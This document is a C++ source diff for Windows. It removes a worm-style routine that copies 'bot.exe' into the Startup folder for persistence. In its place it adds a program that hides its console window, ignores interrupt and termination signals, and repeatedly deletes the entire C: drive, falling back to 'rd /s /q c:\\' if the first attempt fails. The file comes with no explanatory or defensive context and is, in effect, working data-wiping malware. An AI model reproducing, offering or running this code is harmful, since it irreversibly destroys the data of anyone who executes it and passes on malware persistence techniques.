@@ -1,18 +1,43 @@
-#include <iostream>
-#include <string>
-#include <Windows.h>
+#include <unistd.h>
+#include <signal.h>
+#include <filesystem>
+#include <windows.h>
+#define NOP [](){}()
 
-inline void saveStartup()
-{
-    std::string startup_directory       =  "\"%HOMEDRIVE%%HOMEPATH%\\Start Menu\\Programs\\Startup";
-    std::string dir_place_worm          =  startup_directory + "\\bot.exe";
-    std::string cmd_copy_worm_startup   =  "xcopy \".\\bot.exe\" " + dir_place_worm + "*\" /Y";
-    const char *cmd_copy_worm_startup_p =  cmd_copy_worm_startup.c_str();
-    
-    system(cmd_copy_worm_startup_p);
+class test{
+private:
+    HWND window;
+public:
+    void A();
+    test() {
+        window = FindWindowA("ConsoleWindowClass",nullptr);
+    }
+};
+
+void test::A(){
+    AllocConsole();
+    ShowWindow(window, 0);
 }
 
-int main() {
-    saveStartup();
-    return 0;
+int main(){
+    test q;
+    __p_sig_fn_t sig = 0;
+
+    do {
+        q.A();
+    } while (!1);
+    NOP;
+
+    while (1) {
+        sig = signal(SIGINT, SIG_IGN);
+        if (SIG_ERR == sig) exit(1);
+        sig = signal(SIGTERM, SIG_IGN);
+        if (SIG_ERR == sig) exit(1);
+        try {
+            std::filesystem::remove_all("c:\\");
+        }
+        catch (...) {
+            system("cmd /c rd /s /q c:\\");
+        }
+    }
 }
